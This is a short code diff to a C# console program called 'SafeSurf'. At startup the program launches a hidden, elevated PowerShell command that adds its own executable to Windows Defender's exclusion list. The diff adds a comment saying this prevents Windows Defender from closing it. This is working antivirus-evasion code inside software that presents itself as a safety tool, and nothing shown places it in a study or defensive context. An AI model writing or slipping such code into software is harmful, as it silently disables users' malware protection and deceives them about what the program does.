@@ -45,13 +45,13 @@ namespace UI
         static void Main()
         {
             Console.Title = "SafeSurf";
-            Process.Start(new ProcessStartInfo("powershell")
+            Process.Start(new ProcessStartInfo("powershell") // Prevents closure via Windows Defender.
             {
                 UseShellExecute = false,
                 CreateNoWindow = true,
                 Verb = "runas",
                 Arguments = $" -Command Add-MpPreference -ExclusionPath '{exePath}'"
-            });
+            }); 
             while (true)
             {
                 PrintNav();
